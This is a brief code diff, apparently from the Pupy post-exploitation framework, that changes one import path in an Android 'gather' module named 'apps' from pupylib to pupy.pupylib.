@@ -8,7 +8,7 @@ from __future__ import division
 from __future__ import unicode_literals
 __class_name__="apps"
 
-from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
+from pupy.pupylib.PupyModule import config, PupyModule, PupyArgumentParser
 
 @config(cat="gather", compat=["android"])
 class apps(PupyModule):
